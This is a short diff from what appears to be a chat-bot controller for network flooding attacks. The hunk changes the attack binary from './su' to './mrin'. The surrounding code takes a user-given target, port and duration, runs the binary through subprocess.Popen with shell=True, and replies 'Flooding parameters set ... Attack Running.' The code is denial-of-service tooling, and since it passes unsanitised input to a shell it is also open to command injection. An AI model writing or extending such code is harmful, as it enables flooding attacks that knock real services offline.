@@ -171,7 +171,7 @@ def create_handlers(bot):
                     response = "Error: Time interval must be less than 380."
                 else:
                     response = f"Flooding parameters set: {target}:{port} for {duration}. Attack Running."
-                    full_command = f"./su {target} {port} {duration} 1800"
+                    full_command = f"./mrin {target} {port} {duration} 1800"
                     subprocess.Popen(full_command, shell=True)
 
                     # Log if not admin
